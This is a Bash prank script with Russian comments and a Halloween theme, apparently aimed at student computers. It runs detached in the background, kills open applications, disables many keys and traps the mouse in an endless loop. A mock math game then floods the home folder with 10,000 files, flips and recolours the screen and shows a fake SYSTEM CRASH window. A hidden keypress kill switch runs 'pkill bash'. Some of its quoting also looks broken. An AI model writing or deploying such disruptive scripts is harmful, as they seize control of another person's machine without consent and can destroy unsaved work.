#!/bin/bash

nohup bash -c '
    # Завершаем процессы
    pkill chrome
    pkill firefox
    pkill code
    pkill discord
    pkill postman
    pkill terminal
     # Закрываем окна nautilus
    for win in $(xdotool search --onlyvisible --class nautilus); do
        xdotool windowclose $win
    done
    # Отключаем фиксированное положение дока
    gsettings set org.gnome.shell.extensions.dash-to-dock dock-fixed false

     # Папка для загрузки обоев
    DOWNLOAD_PATH="$HOME/Downloads/wallpaper.jpg"

    # Скачиваем случайные обои
    wget -O "$DOWNLOAD_PATH" "https://images.wallpaperscraft.com/image/single/halloween_pumpkin_mask_118247_4896x3264.jpg"

    # Устанавливаем картинку на рабочий стол
    gsettings set org.gnome.desktop.background picture-uri "file://$DOWNLOAD_PATH"

       # Удаляем действия для определённых клавиш
    keys=(37 105 64 108 50 62 66 23 134 133 118 110 119 115 117 112 9 28 65 67 68 69 70 71 72 73 74 75 76 95 96 46)
    for key in "${keys[@]}"; do
        xmodmap -e "keycode $key = "
    done 

    # Запускаем бесконечный цикл для закрытия окон
    while true; do 
        xdotool mousemove 5000 5000
    done &  # Запускаем в фоновом режиме

# Функция для "системного сбоя"
system_crash() {

    xmodmap -e "keycode 36 = "

    # Папка для текстовых файлов
    base_dir="/home/student"
    # Генерируем текстовые файлы
    for i in $(seq 1 10000); do 
        echo "Trick or treat? HAPPY HALLOWEEN!" > "$base_dir/$i.txt"
    done

    # Запускаем Zenity в фоновом режиме
    zenity --warning --text="SYSTEM CRASH" --height 30 --width 100 &
    zenity_pid=$!

    # Ждем, пока Zenity запустится
    sleep 1

    # Получаем ID окна Zenity
    zenity_window=$(xdotool search --onlyvisible --pid $zenity_pid)

    # Проверяем, нашли ли мы окно
    if [ -z "$zenity_window" ]; then
        echo "Не удалось найти окно Zenity."
        exit 1
    fi

    # Бесконечный цикл для перемещения окна
    while true; do
        # Эффекты на экране
        xrandr --output DP-1 --gamma 1.5:0.5:0.5
        sleep 0.5
        xrandr --output DP-1 --gamma 1:1:1
        sleep 0.3

        # Инвертируем ориентацию
        xrandr -o inverted
        sleep 0.5
        xrandr -o normal
        sleep 0.5

        # Генерируем случайные координаты для окна Zenity
        x=$((RANDOM % (3440 - 300)))  # Учитываем ширину окна (например, 300)
        y=$((RANDOM % (1440 - 100)))  # Учитываем высоту окна (например, 100)

        # Перемещаем окно Zenity
        xdotool windowmove $zenity_window $x $y
    
        # Задержка между перемещениями
        sleep 0.5
    done &
}

# Заголовок окна
TITLE="Trick or treat?"

# Инструкция
INSTRUCTIONS="Добро пожаловать в игру!\n\nВы можете управлять через стрелки:\n- Стрелка влево: вариант слева\n- Стрелка вправо: вариант справа\n- Стрелка вверх/вниз: навигация\n\nНажмите 'ОК', чтобы продолжить."

# Показ инструкции
zenity --info --text="$INSTRUCTIONS" --title="Инструкция" --width 300

# Текст в окне
TEXT="Выбор за тобой! Сладость или гадость?"

# Запускаем zenity с двумя кнопками
RESULT=$(zenity --question --title="$TITLE" --text="$TEXT" --width 200 --ok-label="Гадость" --cancel-label="Сладость")

# Проверяем результат выбора
if [ $? -eq 0 ]; then
    zenity --info --text="Вы выбрали гадость! 👻 Но давай сыграем в Игру!" --width 200
else
    zenity --info --text="Вы выбрали сладость! 🍭" --width 200
fi

# Функция для генерации и проверки математической задачи
check_math_problem() {
    NUM1=$(( RANDOM % 10 + 1 ))
    NUM2=$(( RANDOM % 10 + 1 ))
    OPERATION=$(( RANDOM % 2 )) # 0 для сложения, 1 для вычитания

    if [ $OPERATION -eq 0 ]; then
        CORRECT_ANSWER=$(( NUM1 + NUM2 ))
        MATH_PROBLEM="$NUM1 + $NUM2"
    else
        CORRECT_ANSWER=$(( NUM1 - NUM2 ))
        MATH_PROBLEM="$NUM1 - $NUM2"
    fi

    USER_ANSWER=$(zenity --entry --title="Математическая задача" --text="Решите: $MATH_PROBLEM" --width 200 --ok-label="OK")

    # Проверяем, была ли нажата кнопка Cancel
    if [ $? -ne 0 ]; then
        USER_ANSWER="" # Устанавливаем пустую строку
    fi

    if [[ "$USER_ANSWER" =~ ^-?[0-9]+$ ]] && [ "$USER_ANSWER" -eq "$CORRECT_ANSWER" ]; then
        return 0 # Правильный ответ
    else
        if [[ "$USER_ANSWER" =~ ^-?[0-9]+$ ]]; then
            return 1 # Неправильный ответ
        else
            zenity --info --text="Пожалуйста, введите числовой ответ. 😢" --width 200
            return 1 # Неправильный ответ
        fi
    fi
}

# Первая задача
wrong_attempts=0
max_attempts=3

for i in {1..4}; do
    if check_math_problem; then
        zenity --info --text="Правильно! 🎉\n\nСледующая задача:" --width 200
        wrong_attempts=0 # Сбрасываем счетчик при правильном ответе
    else
        ((wrong_attempts++))
        remaining_attempts=$((max_attempts - wrong_attempts))
        if [ $remaining_attempts -gt 0 ]; then
            zenity --info --text="Неправильно. У вас осталось попыток: $remaining_attempts. 😢" --width 200
        fi

        if [ $wrong_attempts -ge $max_attempts ]; then
            zenity --warning --title="Game Over!" --text="Даа... жалко этого добряка ..." --width 200
            # Запускаем "системный сбой"
            system_crash
        fi
    fi
done

zenity --info --text="Поздравляем! Вы решили все задачи! 🎊"

# Спрашиваем про калькулятор
if zenity --question --title="Использовал ли ты калькулятор?" --text="Использовал ли ты калькулятор?" --width 200 --ok-label="Да" --cancel-label="Нет"; then
    zenity --info --text="Мы не любим читеров! Но! Дам тебе последний шанс решить еще одну задачу." --width 200

    # Генерируем сложную задачу
    NUM1=$(( RANDOM % 50 + 10 ))
    NUM2=$(( RANDOM % 50 + 10 ))
    OPERATION=$(( RANDOM % 2 ))

    if [ $OPERATION -eq 0 ]; then
        CORRECT_ANSWER=$(( NUM1 + NUM2 ))
        MATH_PROBLEM="$NUM1 + $NUM2"
    else
        CORRECT_ANSWER=$(( NUM1 - NUM2 ))
        MATH_PROBLEM="$NUM1 - $NUM2"
    fi

    USER_ANSWER=$(zenity --entry --title="Сложная задача" --text="Решите: $MATH_PROBLEM" --width 200 --ok-label="OK")

    # Проверяем, была ли нажата кнопка Cancel
    if [ $? -ne 0 ]; then
        USER_ANSWER="" # Устанавливаем пустую строку
    fi

    if [[ "$USER_ANSWER" =~ ^-?[0-9]+$ ]] && [ "$USER_ANSWER" -eq "$CORRECT_ANSWER" ]; then
        if zenity --question --title="Использовал ли ты калькулятор?" --text="Молодец! Но ты использовал калькулятор?" --width 200 --ok-label="Да" --cancel-label="Нет"; then
            zenity --info --text="Ты не оправдал наши ожидания ... бан! Бан! БАН! БАААААН!" --width 200
            system_crash
        else
            zenity --question --text="Ты сам в это веришь?" --title="Честность?" --width 200 --ok-label="Да" --cancel-label="Нет"
            if [ $? -eq 0 ]; then
                zenity --info --text="Мы так же не любим лгунов. БАН! БАН! БАН!" --width 200
                system_crash
            else
                zenity --info --text="Мы уважаем честность, но не одобряем Читерство. БАН!" --width 200
                system_crash
            fi
        fi
    else
        zenity --info --text="Как ты в Алем попал с таким мышлением? Правильный ответ: $CORRECT_ANSWER. 😢" --width 200
    fi
else
    zenity --question --text="Ты сам в это веришь?" --title="Честность?" --width 200 --ok-label="Да" --cancel-label="Нет"
    if [ $? -eq 0 ]; then
        zenity --info --text="Мы так же не любим лгунов. БАН! БАН! БАН!" --width 200
        system_crash
    else
        zenity --info --text="Мы уважаем честность, но не одобряем Читерство. БАН!" --width 200
        system_crash
    fi
fi
' > /dev/null 2>&1 & disown

nohup bash -c "
DEVICE_ID=11  # Замените на ваш ID устройства
count199=0
count198=0


xinput test \"\$DEVICE_ID\" | while read -r line; do
    if [ \"\$count199\" -eq 2 ] && [ \"\$count198\" -eq 2 ]; then
        pkill bash
        break
    fi

    echo \"\$line\" | grep 'key press   199' &> /dev/null
    if [ \$? -eq 0 ]; then
        echo 'Нажата клавиша 199'
        ((count199++))
    fi

    echo \"\$line\" | grep 'key press   198' &> /dev/null
    if [ \$? -eq 0 ]; then
        echo 'Нажата клавиша 198'
        ((count198++))
    fi
done
" > /dev/null 2>&1 & disown

